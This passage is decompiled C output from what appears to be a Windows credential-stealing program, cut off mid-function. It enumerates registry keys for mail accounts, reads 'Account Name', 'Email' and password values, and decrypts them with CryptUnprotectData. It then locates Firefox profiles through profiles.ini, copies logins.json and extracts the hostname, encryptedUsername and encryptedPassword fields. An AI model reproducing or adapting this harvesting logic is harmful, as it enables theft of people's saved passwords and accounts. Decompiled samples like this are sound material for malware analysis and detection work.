        return 1;
    }
    // 0x40c82e
    int32_t v18; // bp-12308, 0x40c73a
    int32_t v19 = &v18; // 0x40c845
    int32_t v20 = &v3;
    int32_t v21 = &phkResult;
    int32_t v22 = 0; // 0x40c8e6
    int32_t v23 = v16; // 0x40c8db
    hKey = 2048;
    *(int32_t *)(v23 - 4) = 0;
    *(int32_t *)(v23 - 8) = 0;
    *(int32_t *)(v23 - 12) = 0;
    *(int32_t *)(v23 - 16) = 0;
    *(int32_t *)(v23 - 20) = v14;
    *(int32_t *)(v23 - 24) = v19;
    *(int32_t *)(v23 - 28) = v22;
    *(int32_t *)(v23 - 32) = phkResult;
    int32_t v24 = RegEnumKeyExW((int32_t *)hKey, (int32_t)&g322, (int16_t *)&g322, &g322, &g322, (int16_t *)&g322, &g322, (struct _FILETIME *)&g322); // 0x40c84a
    int32_t result = 0; // 0x40c852
    while (v24 == 0) {
        // 0x40c858
        *(int32_t *)(v23 - 36) = phkResult;
        RegCloseKey(&g322);
        *(int32_t *)(v23 - 40) = v13;
        *(int32_t *)(v23 - 44) = v20;
        lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
        *(int32_t *)(v23 - 48) = (int32_t)&g17;
        *(int32_t *)(v23 - 52) = v20;
        lstrcatW((int16_t *)&g322, (int16_t *)&g322);
        *(int32_t *)(v23 - 56) = v19;
        *(int32_t *)(v23 - 60) = v20;
        lstrcatW((int16_t *)&g322, (int16_t *)&g322);
        *(int32_t *)(v23 - 64) = v21;
        *(int32_t *)(v23 - 68) = 0xf003f;
        *(int32_t *)(v23 - 72) = 0;
        *(int32_t *)(v23 - 76) = v20;
        *(int32_t *)(v23 - 80) = -0x7fffffff;
        int32_t v25 = RegOpenKeyExW(&g322, (int16_t *)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t **)&g322); // 0x40c8ae
        result = 0;
        if (v25 != 0) {
            // break -> 0x40c8f7
            break;
        }
        // 0x40c8b4
        int32_t v26; // 0x40c73a
        *(int32_t *)(v23 - 84) = v26;
        *(int32_t *)(v23 - 88) = phkResult;
        function_40c8fc((int32_t)&g322);
        *(int32_t *)(v23 - 92) = phkResult;
        RegCloseKey(&g322);
        *(int32_t *)(v23 - 96) = v21;
        *(int32_t *)(v23 - 100) = 0xf003f;
        *(int32_t *)(v23 - 104) = 0;
        *(int32_t *)(v23 - 108) = v13;
        v23 -= 112;
        *(int32_t *)v23 = -0x7fffffff;
        int32_t v27 = RegOpenKeyExW(&g322, (int16_t *)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t **)&g322); // 0x40c8e0
        result = 0;
        if (v27 != 0) {
            // break -> 0x40c8f7
            break;
        }
        // 0x40c8e6
        v22++;
        v26 = v21;
        result = 1;
        if (v22 >= v15) {
            // break -> 0x40c8f7
            break;
        }
        hKey = 2048;
        *(int32_t *)(v23 - 4) = 0;
        *(int32_t *)(v23 - 8) = 0;
        *(int32_t *)(v23 - 12) = 0;
        *(int32_t *)(v23 - 16) = 0;
        *(int32_t *)(v23 - 20) = v14;
        *(int32_t *)(v23 - 24) = v19;
        *(int32_t *)(v23 - 28) = v22;
        *(int32_t *)(v23 - 32) = phkResult;
        v24 = RegEnumKeyExW((int32_t *)hKey, (int32_t)&g322, (int16_t *)&g322, &g322, &g322, (int16_t *)&g322, &g322, (struct _FILETIME *)&g322);
        result = 0;
    }
    // 0x40c8f7
    return result;
}

// Address range: 0x40c8fc - 0x40cc6b
int32_t function_40c8fc(int32_t hKey) {
    // 0x40c8fc
    int32_t v1; // 0x40c8fc
    function_401230(v1);
    int32_t lpcbData = 0x1000; // bp-8, 0x40c914
    int32_t lpData; // bp-8220, 0x40c8fc
    function_401293(&lpData, 0, 0);
    char * v2 = (char *)&lpData; // bp-24, 0x40c942
    int32_t v3 = hKey; // bp-40, 0x40c94d
    int32_t v4 = RegQueryValueExW((int32_t *)hKey, L"Account Name", NULL, NULL, (char *)&lpData, &lpcbData); // 0x40c94e
    int32_t v5 = &lpData;
    int32_t * v6 = &v3; // 0x40c952
    if (v4 == 0) {
        int32_t v7 = v5; // bp-44, 0x40c95a
        function_40428f(v5);
        v6 = &v7;
    }
    int32_t v8 = &lpcbData; // 0x40c93b
    int32_t v9 = (int32_t)v6;
    int32_t * v10 = (int32_t *)(v9 - 4); // 0x40c963
    *v10 = 0x1000;
    lpcbData = 0x1000;
    int32_t * v11 = (int32_t *)(v9 - 8); // 0x40c975
    *v11 = 0;
    int32_t * v12 = (int32_t *)(v9 - 12); // 0x40c977
    *v12 = v5;
    function_401293((int32_t *)lpcbData, (int32_t)&g322, (int32_t)&g322);
    *v10 = v8;
    *v11 = v5;
    *v12 = 0;
    *(int32_t *)(v9 - 16) = 0;
    *(int32_t *)(v9 - 20) = (int32_t)L"Email";
    int32_t v13 = v9 - 24; // 0x40c994
    *(int32_t *)v13 = hKey;
    int32_t v14 = RegQueryValueExW(&g322, (int16_t *)&g322, &g322, &g322, (char *)&g322, &g322); // 0x40c995
    int32_t v15 = v13; // 0x40c999
    if (v14 == 0) {
        // 0x40c99b
        v15 = v9 - 28;
        *(int32_t *)v15 = v5;
        function_40428f((int32_t)&g322);
    }
    int32_t * v16 = (int32_t *)(v15 - 4); // 0x40c9af
    *v16 = 0x1000;
    lpcbData = 0x1000;
    int32_t * v17 = (int32_t *)(v15 - 8); // 0x40c9b9
    *v17 = 0;
    int32_t * v18 = (int32_t *)(v15 - 12); // 0x40c9bb
    *v18 = v5;
    function_401293((int32_t *)lpcbData, (int32_t)&g322, (int32_t)&g322);
    *v16 = v8;
    *v17 = v5;
    *v18 = 0;
    *(int32_t *)(v15 - 16) = 0;
    *(int32_t *)(v15 - 20) = (int32_t)&g106;
    int32_t v19 = v15 - 24; // 0x40c9d8
    *(int32_t *)v19 = hKey;
    int32_t v20 = RegQueryValueExW(&g322, (int16_t *)&g322, &g322, &g322, (char *)&g322, &g322); // 0x40c9d9
    int32_t v21 = v19; // 0x40c9dd
    if (v20 == 0) {
        // 0x40c9df
        v21 = v15 - 28;
        *(int32_t *)v21 = v5;
        function_40428f((int32_t)&g322);
    }
    int32_t * v22 = (int32_t *)(v21 - 4); // 0x40c9f3
    *v22 = 0x1000;
    lpcbData = 0x1000;
    int32_t * v23 = (int32_t *)(v21 - 8); // 0x40c9fd
    *v23 = 0;
    int32_t * v24 = (int32_t *)(v21 - 12); // 0x40c9ff
    *v24 = v5;
    function_401293((int32_t *)lpcbData, (int32_t)&g322, (int32_t)&g322);
    *v22 = v8;
    *v23 = v5;
    *v24 = 0;
    *(int32_t *)(v21 - 16) = 0;
    *(int32_t *)(v21 - 20) = (int32_t)&g107;
    int32_t v25 = v21 - 24; // 0x40ca1c
    *(int32_t *)v25 = hKey;
    int32_t v26 = RegQueryValueExW(&g322, (int16_t *)&g322, &g322, &g322, (char *)&g322, &g322); // 0x40ca1d
    int32_t v27 = v25; // 0x40ca21
    if (v26 == 0) {
        // 0x40ca23
        v27 = v21 - 28;
        *(int32_t *)v27 = v5;
        function_40428f((int32_t)&g322);
    }
    int32_t * v28 = (int32_t *)(v27 - 4); // 0x40ca37
    *v28 = 0x1000;
    lpcbData = 0x1000;
    int32_t * v29 = (int32_t *)(v27 - 8); // 0x40ca41
    *v29 = 0;
    int32_t * v30 = (int32_t *)(v27 - 12); // 0x40ca43
    *v30 = v5;
    function_401293((int32_t *)lpcbData, (int32_t)&g322, (int32_t)&g322);
    *v28 = v8;
    *v29 = v5;
    *v30 = 0;
    *(int32_t *)(v27 - 16) = 0;
    *(int32_t *)(v27 - 20) = 0x41ae30;
    int32_t v31 = v27 - 24; // 0x40ca60
    *(int32_t *)v31 = hKey;
    int32_t v32 = RegQueryValueExW(&g322, (int16_t *)&g322, &g322, &g322, (char *)&g322, &g322); // 0x40ca61
    int32_t v33 = v31; // 0x40ca65
    if (v32 == 0) {
        // 0x40ca67
        v33 = v27 - 28;
        *(int32_t *)v33 = v5;
        function_40428f((int32_t)&g322);
    }
    int32_t * v34 = (int32_t *)(v33 - 4); // 0x40ca7b
    *v34 = 0x1000;
    lpcbData = 0x1000;
    int32_t * v35 = (int32_t *)(v33 - 8); // 0x40ca85
    *v35 = 0;
    int32_t * v36 = (int32_t *)(v33 - 12); // 0x40ca87
    *v36 = v5;
    function_401293((int32_t *)lpcbData, (int32_t)&g322, (int32_t)&g322);
    *v34 = v8;
    *v35 = v5;
    *v36 = 0;
    *(int32_t *)(v33 - 16) = 0;
    *(int32_t *)(v33 - 20) = (int32_t)&g108;
    int32_t v37 = v33 - 24; // 0x40caa4
    *(int32_t *)v37 = hKey;
    int32_t v38 = RegQueryValueExW(&g322, (int16_t *)&g322, &g322, &g322, (char *)&g322, &g322); // 0x40caa5
    int32_t v39 = v37; // 0x40caa9
    int32_t v40; // bp-16412, 0x40c8fc
    if (v38 == 0) {
        // 0x40caab
        v39 = v33 - 28;
        int32_t * v41 = (int32_t *)v39; // 0x40caab
        *v41 = 0x1000;
        *(int32_t *)(v33 - 32) = v38;
        int32_t v42 = &v40; // 0x40cab7
        *(int32_t *)(v33 - 36) = v42;
        function_401293(&g322, (int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v33 - 40) = lpcbData;
        function_40cc6b((int32_t)&g322);
        *v41 = v42;
        function_40428f((int32_t)&g322);
    }
    int32_t * v43 = (int32_t *)(v39 - 4); // 0x40cae8
    *v43 = 0x1000;
    lpcbData = 0x1000;
    int32_t * v44 = (int32_t *)(v39 - 8); // 0x40caf2
    *v44 = 0;
    int32_t * v45 = (int32_t *)(v39 - 12); // 0x40caf4
    *v45 = v5;
    function_401293((int32_t *)lpcbData, (int32_t)&g322, (int32_t)&g322);
    *v43 = v8;
    *v44 = v5;
    *v45 = 0;
    *(int32_t *)(v39 - 16) = 0;
    *(int32_t *)(v39 - 20) = 0x41ae64;
    int32_t v46 = v39 - 24; // 0x40cb11
    *(int32_t *)v46 = hKey;
    int32_t v47 = RegQueryValueExW(&g322, (int16_t *)&g322, &g322, &g322, (char *)&g322, &g322); // 0x40cb12
    int32_t v48 = v46; // 0x40cb16
    if (v47 == 0) {
        // 0x40cb18
        v48 = v39 - 28;
        int32_t * v49 = (int32_t *)v48; // 0x40cb18
        *v49 = 0x1000;
        *(int32_t *)(v39 - 32) = v47;
        int32_t v50 = &v40; // 0x40cb24
        *(int32_t *)(v39 - 36) = v50;
        function_401293(&g322, (int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v39 - 40) = lpcbData;
        function_40cc6b((int32_t)&g322);
        *v49 = v50;
        function_40428f((int32_t)&g322);
    }
    int32_t * v51 = (int32_t *)(v48 - 4); // 0x40cb55
    *v51 = 0x1000;
    lpcbData = 0x1000;
    int32_t * v52 = (int32_t *)(v48 - 8); // 0x40cb5f
    *v52 = 0;
    int32_t * v53 = (int32_t *)(v48 - 12); // 0x40cb61
    *v53 = v5;
    function_401293((int32_t *)lpcbData, (int32_t)&g322, (int32_t)&g322);
    *v51 = v8;
    *v52 = v5;
    *v53 = 0;
    *(int32_t *)(v48 - 16) = 0;
    *(int32_t *)(v48 - 20) = 0x41ae80;
    int32_t v54 = v48 - 24; // 0x40cb7e
    *(int32_t *)v54 = hKey;
    int32_t v55 = RegQueryValueExW(&g322, (int16_t *)&g322, &g322, &g322, (char *)&g322, &g322); // 0x40cb7f
    int32_t v56 = v54; // 0x40cb83
    if (v55 == 0) {
        // 0x40cb85
        v56 = v48 - 28;
        int32_t * v57 = (int32_t *)v56; // 0x40cb85
        *v57 = 0x1000;
        *(int32_t *)(v48 - 32) = v55;
        int32_t v58 = &v40; // 0x40cb91
        *(int32_t *)(v48 - 36) = v58;
        function_401293(&g322, (int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v48 - 40) = lpcbData;
        function_40cc6b((int32_t)&g322);
        *v57 = v58;
        function_40428f((int32_t)&g322);
    }
    int32_t * v59 = (int32_t *)(v56 - 4); // 0x40cbc2
    *v59 = 0x1000;
    lpcbData = 0x1000;
    int32_t * v60 = (int32_t *)(v56 - 8); // 0x40cbcc
    *v60 = 0;
    int32_t * v61 = (int32_t *)(v56 - 12); // 0x40cbce
    *v61 = v5;
    function_401293((int32_t *)lpcbData, (int32_t)&g322, (int32_t)&g322);
    *v59 = v8;
    *v60 = v5;
    *v61 = 0;
    *(int32_t *)(v56 - 16) = 0;
    *(int32_t *)(v56 - 20) = 0x41ae9c;
    int32_t v62 = v56 - 24; // 0x40cbeb
    *(int32_t *)v62 = hKey;
    int32_t v63 = RegQueryValueExW(&g322, (int16_t *)&g322, &g322, &g322, (char *)&g322, &g322); // 0x40cbec
    int32_t v64 = v62; // 0x40cbf0
    if (v63 == 0) {
        // 0x40cbf2
        v64 = v56 - 28;
        int32_t * v65 = (int32_t *)v64; // 0x40cbf2
        *v65 = 0x1000;
        *(int32_t *)(v56 - 32) = v63;
        int32_t v66 = &v40; // 0x40cbfe
        *(int32_t *)(v56 - 36) = v66;
        function_401293(&g322, (int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v56 - 40) = lpcbData;
        function_40cc6b((int32_t)&g322);
        *v65 = v66;
        function_40428f((int32_t)&g322);
    }
    // 0x40cc2a
    if (v2 == NULL) {
        // 0x40cc59
        function_4015d4();
        return 1;
    }
    // 0x40cc37
    *(int32_t *)(v64 - 4) = (int32_t)v2;
    if (lstrlenW((int16_t *)3) >= 1) {
        // 0x40cc44
        *(int32_t *)(v64 - 24) = (int32_t)&v2;
        function_402790((int32_t)&g322);
        function_40283b();
    }
    // 0x40cc59
    function_4015d4();
    return 1;
}

// Address range: 0x40cc6b - 0x40cd01
int32_t function_40cc6b(uint32_t a1) {
    // 0x40cc6b
    int32_t lpString1; // 0x40cc6b
    function_401230(lpString1);
    int32_t dwBytes = a1 - 1; // 0x40cc83
    int32_t pDataOut = 64; // bp-24, 0x40cc87
    int32_t * v1 = GlobalAlloc(64, dwBytes); // 0x40cc89
    if (a1 >= 2) {
        int32_t v2 = (int32_t)v1 - 1; // 0x40cc9e
        int32_t v3 = 1;
        *(char *)(v2 + v3) = *(char *)(v3 + lpString1);
        int32_t v4 = v3 + 1; // 0x40cca2
        while (v4 != a1) {
            // 0x40cc9b
            v3 = v4;
            *(char *)(v2 + v3) = *(char *)(v3 + lpString1);
            v4 = v3 + 1;
        }
    }
    int32_t pDataIn = dwBytes; // bp-16, 0x40ccad
    bool v5 = CryptUnprotectData((struct _CRYPTOAPI_BLOB *)&pDataIn, NULL, NULL, NULL, NULL, 0, (struct _CRYPTOAPI_BLOB *)&pDataOut); // 0x40ccbf
    int16_t * lpString2 = L"Could not decrypt"; // 0x40ccc7
    if (!v5) {
        // 0x40ccf5
        return (int32_t)lstrcpyW((int16_t *)lpString1, lpString2);
    }
    int32_t lpString2_; // bp-8216, 0x40cc6b
    if (a1 < 1) {
        // 0x40ccf5
        return (int32_t)lstrcpyW((int16_t *)lpString1, (int16_t *)&lpString2_);
    }
    int32_t v6 = &lpString2_; // 0x40ccd0
    int32_t v7 = 0;
    int32_t v8 = v7 + 2; // 0x40ccda
    *(int16_t *)v6 = (int16_t)*(char *)(v7 + dwBytes);
    v6 += 2;
    while (v8 < a1) {
        // 0x40ccd6
        v7 = v8;
        v8 = v7 + 2;
        *(int16_t *)v6 = (int16_t)*(char *)(v7 + dwBytes);
        v6 += 2;
    }
    // 0x40ccf5
    return (int32_t)lstrcpyW((int16_t *)lpString1, (int16_t *)&lpString2_);
}

// Address range: 0x40cd01 - 0x40d379
int32_t function_40cd01(int32_t a1) {
    // 0x40cd01
    int32_t v1; // 0x40cd01
    int32_t lpString = v1;
    function_40460a(L"Profile");
    int32_t v2; // bp-1232, 0x40cd01
    function_401293(&v2, 0, 520);
    int32_t lpBinaryType = 0; // bp-160, 0x40cd3e
    int32_t lpApplicationName; // bp-712, 0x40cd01
    function_401293(&lpApplicationName, 0, 260);
    function_40eb8e();
    function_40460a((int16_t *)&lpApplicationName);
    GetBinaryTypeW((int16_t *)&lpApplicationName, &lpBinaryType);
    int32_t v3; // bp-56, 0x40cd01
    int32_t v4 = &v3; // 0x40cd8a
    int32_t v5 = v4; // bp-1272, 0x40cd8a
    function_404656(v4);
    int32_t v6 = function_40df9d((int32_t)&g322); // 0x40cd92
    int32_t * v7 = &v5; // 0x40cd99
    if (v6 == 0) {
        int32_t v8 = v4; // bp-1280, 0x40cda1
        function_404656(v4);
        int32_t v9 = function_40df9d((int32_t)&g322); // 0x40cda9
        v7 = &v8;
        if (v9 == 0) {
            // 0x40d359
            function_406f1d();
            function_406f1d();
            function_406f1d();
            return 0;
        }
    }
    int32_t v10 = (int32_t)v7;
    int32_t v11 = v10 - 4; // 0x40cdba
    *(int32_t *)v11 = (int32_t)&g105;
    function_4043fa((int16_t *)&g322);
    int32_t lpString1 = 0; // 0x40cdcd
    int32_t v12 = v11; // 0x40cdcd
    if (a1 != 0) {
        // 0x40cdcf
        *(int32_t *)(v10 - 8) = a1;
        lstrlenW(NULL);
        lpString1 = function_406f2c();
        *(int32_t *)(v10 - 12) = a1;
        v12 = v10 - 16;
        *(int32_t *)v12 = lpString1;
        lstrcpyW((int16_t *)lpString1, (int16_t *)&g322);
    }
    // 0x40cdf1
    *(int32_t *)(v12 - 4) = (int32_t)L"profiles.ini";
    function_4043fa((int16_t *)&g322);
    *(int32_t *)(v12 - 8) = (int32_t)L"Profile";
    *(int32_t *)(v12 - 12) = function_40460a((int16_t *)&g322);
    function_4043c7((int32_t)&g322);
    function_406f1d();
    *(int32_t *)(v12 - 16) = 0;
    function_404477((int32_t)&g322);
    *(int32_t *)(v12 - 20) = lpString1;
    *(int32_t *)(v12 - 24) = 260;
    int32_t v13 = &v2; // 0x40ce36
    *(int32_t *)(v12 - 28) = v13;
    *(int32_t *)(v12 - 32) = 0;
    *(int32_t *)(v12 - 36) = (int32_t)L"Path";
    int32_t v14 = GetPrivateProfileStringW((int16_t *)&g322, (int16_t *)&g322, (int16_t *)&g322, (int16_t *)&g322, (int32_t)&g322, (int16_t *)&g322); // 0x40ce3e
    if (v14 != 0) {
        // 0x40ce49
        int32_t v15; // bp-12, 0x40cd01
        int32_t v16 = &v15;
        int32_t v17; // bp-52, 0x40cd01
        int32_t v18 = &v17;
        char * v19; // bp-100, 0x40cd01
        int32_t v20 = (int32_t)&v19;
        int32_t v21 = 0; // 0x40ce49
        int32_t v22 = v12 - 40;
        v21++;
        *(int32_t *)(v22 - 4) = (int32_t)L"Profile";
        *(int32_t *)(v22 - 8) = function_40460a((int16_t *)v21);
        function_4043c7((int32_t)&g322);
        function_406f1d();
        int32_t v23 = v22 - 12; // 0x40ce6e
        *(int32_t *)v23 = v21;
        function_404477(0);
        int16_t * lpString1_ = NULL; // 0x40ce81
        int32_t v24 = v23; // 0x40ce81
        int32_t v25; // 0x40ce93
        if (a1 != 0) {
            // 0x40ce83
            *(int32_t *)(v22 - 16) = a1;
            lstrlenW(NULL);
            v25 = function_406f2c();
            *(int32_t *)(v22 - 20) = a1;
            lpString1_ = (int16_t *)v25;
            v24 = v22 - 24;
            *(int32_t *)v24 = v25;
            lstrcpyW(lpString1_, (int16_t *)&g322);
        }
        int32_t v26 = v24;
        int16_t * v27 = lpString1_;
        int32_t v28 = v26 - 4; // 0x40ceab
        *(int32_t *)v28 = v13;
        function_4043fa((int16_t *)&g322);
        int32_t v29 = (int32_t)v27; // 0x40ceb4
        int32_t v30 = v28; // 0x40cebe
        int32_t v31; // 0x40cec1
        int32_t v32; // 0x40ced3
        int32_t v33; // 0x40cedd
        int32_t v34; // 0x40cee5
        int32_t v35; // 0x40cf06
        if (v27 != NULL) {
            // 0x40cec0
            *(int32_t *)(v26 - 8) = v29;
            v31 = lstrlenW(NULL);
            *(int32_t *)(v26 - 12) = 0;
            *(int32_t *)(v26 - 16) = 0;
            *(int32_t *)(v26 - 20) = 0;
            *(int32_t *)(v26 - 24) = 0;
            *(int32_t *)(v26 - 28) = v31;
            *(int32_t *)(v26 - 32) = v29;
            *(int32_t *)(v26 - 36) = 512;
            *(int32_t *)(v26 - 40) = 0;
            v32 = WideCharToMultiByte((int32_t)&g322, (int32_t)&g322, (int16_t *)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, (char *)&g322, (bool *)&g322);
            v33 = function_406f2c();
            *(int32_t *)(v26 - 44) = v29;
            v34 = lstrlenW((int16_t *)&g322);
            *(int32_t *)(v26 - 48) = 0;
            *(int32_t *)(v26 - 52) = 0;
            *(int32_t *)(v26 - 56) = v32;
            *(int32_t *)(v26 - 60) = v33;
            *(int32_t *)(v26 - 64) = v34;
            *(int32_t *)(v26 - 68) = v29;
            *(int32_t *)(v26 - 72) = 0;
            *(int32_t *)(v26 - 76) = 0xfde9;
            WideCharToMultiByte((int32_t)&g322, (int32_t)&g322, (int16_t *)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, (char *)&g322, (bool *)&g322);
            *(int32_t *)(v26 - 80) = v33;
            v35 = function_40434f((char *)&g322);
            v30 = v26 - 84;
            *(int32_t *)v30 = v35;
            function_40415d((int32_t)&g322);
            function_406f1d();
            function_406f1d();
        }
        int32_t v36 = v30;
        int32_t * v37 = (int32_t *)(v36 - 4);
        *v37 = 0;
        int32_t * v38 = v37; // 0x40cf3a
        int32_t v39 = v36; // 0x40cf3a
        int32_t * v40; // 0x40cd01
        int32_t * v41; // 0x40cd01
        int32_t * v42; // 0x40cd01
        int32_t * v43; // 0x40cd01
        int32_t v44; // 0x40cd01
        int32_t v45; // 0x40cd01
        int32_t v46; // 0x40cd01
        int32_t v47; // 0x40cd01
        int32_t v48; // 0x40cd01
        int32_t v49; // 0x40cd01
        int32_t v50; // 0x40cd01
        int32_t v51; // 0x40cd01
        int32_t v52; // 0x40cd01
        int32_t v53; // 0x40cd01
        int32_t v54; // bp-104, 0x40cd01
        int32_t v55; // bp-112, 0x40cd01
        int32_t v56; // bp-120, 0x40cd01
        int32_t v57; // bp-128, 0x40cd01
        int32_t v58; // bp-136, 0x40cd01
        int32_t v59; // bp-144, 0x40cd01
        int32_t v60; // bp-188, 0x40cd01
        int32_t v61; // 0x40cd01
        char * v62; // bp-68, 0x40cd01
        int32_t v63; // bp-72, 0x40cd01
        int32_t v64; // bp-76, 0x40cd01
        int32_t * v65; // 0x40cd01
        int32_t v66; // 0x40cd01
        int32_t * v67; // 0x40cd01
        int32_t v68; // 0x40cfed
        int32_t v69; // 0x40cfed
        bool v70; // 0x40cff0
        int32_t v71; // 0x40cf88
        int16_t * lpString1__; // 0x40cf8f
        int32_t v72; // 0x40cffd
        int32_t v73; // 0x40d042
        int32_t v74; // 0x40d04d
        int32_t v75; // 0x40d01f
        int32_t lpString1___; // 0x40d02c
        int32_t v76; // 0x40d03a
        int32_t v77; // 0x40d08b
        int32_t v78; // 0x40d095
        int32_t v79; // 0x40d27f
        bool v80; // 0x40d282
        int32_t v81; // 0x40d0cd
        int32_t * v82; // 0x40d0e0
        int32_t * v83; // 0x40d0e8
        int32_t v84; // 0x40d108
        int32_t * v85; // 0x40d11b
        int32_t * v86; // 0x40d123
        int32_t v87; // 0x40d143
        int32_t * v88; // 0x40d156
        int32_t v89; // 0x40d23d
        int32_t v90; // 0x40d250
        int32_t * v91; // 0x40cd01
        int32_t lpString2; // 0x40d28e
        int32_t * v92; // 0x40d28e
        int32_t v93; // 0x40d296
        int32_t v94; // 0x40d2ab
        int32_t v95; // 0x40d2b6
        if (!((lpString == 0 | *(int32_t *)(lpString + 132) != 0))) {
            // 0x40cf59
            *v37 = 0;
            v65 = (int32_t *)(v36 - 8);
            *v65 = 1;
            v66 = v36 - 12;
            v67 = (int32_t *)v66;
            v38 = v37;
            v39 = v36;
            if (*(int32_t *)(lpString + 152) == 0) {
                // 0x40cf73
                v43 = v67;
                v42 = v65;
                v41 = v37;
                lpString1__ = NULL;
                v47 = v36;
                if (v27 != NULL) {
                    // 0x40cf7a
                    *v37 = v29;
                    lstrlenW((int16_t *)lpString);
                    v71 = function_406f2c();
                    *v65 = v29;
                    *v67 = v71;
                    lpString1__ = (int16_t *)v71;
                    lstrcpyW(lpString1__, (int16_t *)&g322);
                    v43 = (int32_t *)(v36 - 24);
                    v42 = (int32_t *)(v36 - 20);
                    v41 = (int32_t *)(v36 - 16);
                    v47 = v66;
                }
                // 0x40cf98
                v48 = v47;
                *v41 = (int32_t)L"\\logins.json";
                function_4043fa((int16_t *)&g322);
                *v42 = 26;
                function_413915();
                *v42 = (int32_t)&g17;
                function_4043fa((int16_t *)&g322);
                *v43 = 8;
                *v43 = function_4044c4();
                function_4042c5((int32_t)&g322);
                function_406f1d();
                *(int32_t *)(v48 - 16) = (int32_t)L".tmp";
                function_4043fa(NULL);
                *(int32_t *)(v48 - 20) = 0;
                *(int32_t *)(v48 - 24) = v15;
                v68 = (int32_t)lpString1__;
                v69 = v48 - 28;
                *(int32_t *)v69 = v68;
                v70 = CopyFileW((int16_t *)&g322, (int16_t *)&g322, (bool)&g322);
                v72 = v69;
                if (v70) {
                    // 0x40cffa
                    v72 = v48 - 32;
                    *(int32_t *)v72 = v16;
                    function_4043c7((int32_t)&g322);
                }
                // 0x40d006
                v49 = v72;
                function_413fc0();
                v44 = &v60;
                v76 = v49;
                if (lpString1__ != NULL) {
                    // 0x40d01e
                    *(int32_t *)(v49 - 4) = v68;
                    v75 = lstrlenW(NULL);
                    lpString1___ = function_406e8d();
                    *(int32_t *)(v49 - 8) = v68;
                    v76 = v49 - 12;
                    *(int32_t *)v76 = lpString1___;
                    lstrcpyW((int16_t *)lpString1___, (int16_t *)&g322);
                    v44 = 2 * v75 + 2;
                }
                // 0x40d041
                v50 = v76;
                *(int32_t *)(v50 - 4) = v44;
                v73 = v50 - 8;
                *(int32_t *)v73 = -0x40000000;
                v74 = function_413f4f((int32_t)&g322);
                v40 = (int32_t *)(v50 - 12);
                v91 = v40;
                v46 = v73;
                if (v74 != 0) {
                    // 0x40d060
                    *v40 = 0;
                    v17 = 0;
                    *(int32_t *)(v50 - 20) = v18;
                    function_413b7c(v17, 0, (int32_t)&g322);
                    *(int32_t *)(v50 - 24) = (int32_t)"encryptedUsername";
                    function_40434f((char *)&g322);
                    v77 = v50 - 28;
                    *(int32_t *)v77 = (int32_t)&v54;
                    function_403f58((int32_t)&g322);
                    v78 = function_40c354();
                    function_406f1d();
                    function_406f1d();
                    v61 = v78;
                    v51 = v77;
                    v52 = v77;
                    if (v78 != 0) {
                        *(int32_t *)(v51 - 4) = (int32_t)"hostname";
                        v19 = NULL;
                        v81 = function_40434f(NULL);
                        *(int32_t *)(v51 - 8) = (int32_t)&v55;
                        function_403f58((int32_t)&g322);
                        v82 = (int32_t *)(v51 - 12);
                        *v82 = v61;
                        v83 = (int32_t *)(v51 - 16);
                        *v83 = v81;
                        function_40c38d((int32_t)&g322, (int32_t)&g322);
                        function_406f1d();
                        function_406f1d();
                        *v82 = (int32_t)"encryptedUsername";
                        v84 = function_40434f((char *)&g322);
                        *v83 = (int32_t)&v56;
                        function_403f58((int32_t)&g322);
                        v85 = (int32_t *)(v51 - 20);
                        *v85 = v61;
                        v86 = (int32_t *)(v51 - 24);
                        *v86 = v84;
                        function_40c38d((int32_t)&g322, (int32_t)&g322);
                        function_406f1d();
                        function_406f1d();
                        *v85 = (int32_t)"encryptedPassword";
                        v87 = function_40434f((char *)&g322);
                        *v86 = (int32_t)&v57;
                        function_403f58((int32_t)&g322);
                        v88 = (int32_t *)(v51 - 28);
                        *v88 = v61;
                        *(int32_t *)(v51 - 32) = v87;
                        function_40c38d((int32_t)&g322, (int32_t)&g322);
                        function_406f1d();
                        function_406f1d();
                        *v88 = (int32_t)&v58;
                        function_40da6a((int32_t)&g322, (int32_t)&g322);
                        *(int32_t *)(v51 - 36) = (int32_t)&v59;
                        function_40da6a((int32_t)&g322, (int32_t)&g322);
                        *(int32_t *)(v51 - 44) = (int32_t)&v62;
                        *(int32_t *)(v51 - 48) = function_4040d5(&g322);
                        function_4043c7((int32_t)&g322);
                        function_406f1d();
                        *(int32_t *)(v51 - 52) = v58;
                        v62 = NULL;
                        function_40434f(NULL);
                        *(int32_t *)(v51 - 56) = (int32_t)&v63;
                        *(int32_t *)(v51 - 60) = function_4040d5(&g322);
                        function_4043c7((int32_t)&g322);
                        function_406f1d();
                        v63 = 0;
                        function_406f1d();
                        *(int32_t *)(v51 - 64) = v59;
                        function_40434f((char *)&g322);
                        *(int32_t *)(v51 - 68) = (int32_t)&v64;
                        *(int32_t *)(v51 - 72) = function_4040d5(&g322);
                        function_4043c7((int32_t)&g322);
                        function_406f1d();
                        v64 = 0;
                        function_406f1d();
                        v89 = v51 - 92;
                        *(int32_t *)v89 = v20;
                        function_402790(4);
                        function_40283b();
                        v90 = v61 - 1;
                        function_406f1d();
                        function_406f1d();
                        function_406f1d();
                        function_4015d4();
                        v61 = v90;
                        v51 = v89;
                        v52 = v89;
                        while (v90 != 0) {
                            // 0x40d0bc
                            *(int32_t *)(v51 - 4) = (int32_t)"hostname";
                            v19 = NULL;
                            v81 = function_40434f(NULL);
                            *(int32_t *)(v51 - 8) = (int32_t)&v55;
                            function_403f58((int32_t)&g322);
                            v82 = (int32_t *)(v51 - 12);
                            *v82 = v61;
                            v83 = (int32_t *)(v51 - 16);
                            *v83 = v81;
                            function_40c38d((int32_t)&g322, (int32_t)&g322);
                            function_406f1d();
                            function_406f1d();
                            *v82 = (int32_t)"encryptedUsername";
                            v84 = function_40434f((char *)&g322);
                            *v83 = (int32_t)&v56;
                            function_403f58((int32_t)&g322);
                            v85 = (int32_t *)(v51 - 20);
                            *v85 = v61;
                            v86 = (int32_t *)(v51 - 24);
                            *v86 = v84;
                            function_40c38d((int32_t)&g322, (int32_t)&g322);
                            function_406f1d();
                            function_406f1d();
                            *v85 = (int32_t)"encryptedPassword";
